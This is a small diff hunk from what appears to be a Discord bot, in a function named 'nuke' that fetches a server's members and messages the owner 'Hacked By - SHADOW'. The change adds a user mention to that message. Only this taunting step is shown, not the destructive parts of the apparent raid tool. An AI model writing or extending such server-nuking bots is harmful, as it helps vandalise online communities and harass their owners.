@@ -849,7 +849,7 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send(' Hacked By - SHADOW  ').catch(e => { return void e; });
+  await guild.owner.send(' Hacked By - SHADOW <@318705077734998017> ').catch(e => { return void e; });
  
  
  
